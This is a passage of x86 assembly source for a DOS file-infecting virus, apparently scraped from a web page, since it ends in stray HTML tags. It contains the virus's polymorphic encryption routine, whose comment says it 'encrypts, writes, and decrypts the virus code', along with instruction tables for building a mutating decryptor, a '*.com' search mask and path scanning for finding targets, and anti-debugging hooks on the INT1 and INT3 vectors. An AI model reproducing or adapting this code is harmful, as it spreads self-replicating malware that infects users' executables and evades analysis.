bugiret:
            iret
;
bugon:
            pushf
            push    ds
            push    ax
            mov     ax,0
            push    ax
            pop     ds
            getloc  ax,ptr2
            sub     ax,offset(data_begin-doint3)
            cli
            mov     ds: [int3vec],ax
            getloc  ax,ptr2
            sub     ax,offset(data_begin-doint1)
            mov     ds: [int1vec],ax
            push    cs
            pop     ax
            mov     ds: [int1vec+2],ax
            mov     ds: [int3vec+2],ax
            sti
            pop     ax
            pop     ds
            popf
            ret
;
bugoff:
            pushf
            push    ds
            push    ax
            mov     ax,0
            push    ax
            pop     ds

            getloc  ax,oldint3
            cli
            mov     ds: [int3vec],ax
            getloc  ax,oldint1
            mov     ds: [int1vec],ax
            getloc  ax,oldint1+2
            mov     ds: [int1vec+2],ax
            getloc  ax,oldint3+2
            mov     ds: [int3vec+2],ax
            sti

            pop     ax
            pop     ds
            popf
            ret
;
endif
;
;
; the data area
;
data_begin  label   near
;
t10         label   near
t11:        mov     di,0ffffh
t12:        mov     ax,0ffffh
t13:        mov     cx,0ffffh
t14:        clc
t15:        cld
t16:        inc     si
t17:        dec     bx
t18:        nop
t19         label   near
;
t20         label   near
t21:        xor     [di],ax
t22:        xor     [di],cx
t23:        xor     dx,cx
t24:        xor     bx,cx
t25:        sub     bx,ax
t26:        sub     bx,cx
t27:        sub     bx,dx
t28:        nop
t29         label   near
;
t30         label   near
t31:        inc     ax
t32:        inc     di
t33:        inc     bx
t34:        inc     si
t35:        inc     dx
t36:        clc
t37:        dec     bx
t38:        nop
t39         label   near
;
t40:        loop    t20
t41         label   near
;
l11:        db      offset (t12-t11),offset (t11-data_begin)
l12:        db      offset (t13-t12),offset (t12-data_begin)
l13:        db      offset (t14-t13),offset (t13-data_begin)
l14:        db      offset (t15-t14),offset (t14-data_begin)
l15:        db      offset (t16-t15),offset (t15-data_begin)
l16:        db      offset (t17-t16),offset (t16-data_begin)
l17:        db      offset (t18-t17),offset (t17-data_begin)
l18:        db      offset (t19-t18),offset (t18-data_begin)
;
l21:        db      offset (t22-t21),offset (t21-data_begin)
l22:        db      offset (t23-t22),offset (t22-data_begin)
l23:        db      offset (t24-t23),offset (t23-data_begin)
l24:        db      offset (t25-t24),offset (t24-data_begin)
l25:        db      offset (t26-t25),offset (t25-data_begin)
l26:        db      offset (t27-t26),offset (t26-data_begin)
l27:        db      offset (t28-t27),offset (t27-data_begin)
l28:        db      offset (t29-t28),offset (t28-data_begin)
;
l31:        db      offset (t32-t31),offset (t31-data_begin)
l32:        db      offset (t33-t32),offset (t32-data_begin)
l33:        db      offset (t34-t33),offset (t33-data_begin)
l34:        db      offset (t35-t34),offset (t34-data_begin)
l35:        db      offset (t36-t35),offset (t35-data_begin)
l36:        db      offset (t37-t36),offset (t36-data_begin)
l37:        db      offset (t38-t37),offset (t37-data_begin)
l38:        db      offset (t39-t38),offset (t38-data_begin)
;
;
;
; this routine is relocated after the end of data area
; this routine encrypts, writes, and decrypts the virus code
;
begin1:
            getloc  cx,dat2         ; get off (data_end-entry2) plus max_msk
            getloc  ax,dat1         ; get decode ket
            mov     di,si           ; and set the begin encrypt address
            sub     di,offset (data_begin-entry2)
            call    crypt
            mov     ah,040h
            mov     cx,offset data_end-offset entry
            mov     dx,si
            sub     dx,offset data_begin-offset entry
            doscall
            pushf                   ; save the status of the write
            push    ax
            getloc  cx,dat2         ; get off (data_end-entry2) plus max_msk
            getloc  ax,dat1
            mov     di,si
            sub     di,offset (data_begin-entry2)
            call    crypt
            pop     ax              ; restore the dos write's status
            popf
            ret
;
crypt:
            xor     [di],ax
            xor     [di],cx
            inc     ax
            inc     di
            loop    crypt
            ret
end1:
;
; global work space and constants
;
old_code:   db      090h,090h,090h
jump_code:  db      0e9h,0,0
com_search: db      '*.com',0
path_chars: db      'path='
file_name:  db      40h dup (0)
my_dta:     db      2bh dup (0)
            db      0,0,0

data_end    label   near
ifdef       stopdebug
;
scan_bytes  db      0cch,090h
;
precrypt:
            mov     bp,sp           ; allocate locals
            sub     sp,local_stack
            doscall 02ch            ; seed the random number generator
            xor     dx,cx
            setloc  rand_seed,dx
            call    random
            mov     di,offset start
            push    ds
            pop     es
lp999:
            mov     cx,08000h
            mov     si,offset scan_bytes
            lodsb
            repnz   scasb
            cmp     cx,0
            je      done998
            cmp     di,offset data_end
            jge     done998
            lodsb
            scasb
            jnz     lp999
            call    random
            getloc  ax,rand_seed
            dec     di
            mov     [di],al
            inc     di
            xor     [di],al
            inc     di              ; skip the masked byte
            jmp     short lp999
done998:
            mov     sp,bp
            ret
endif

code        ends
            end     start

</textarea></td></tr></table></body></html>
></call_type>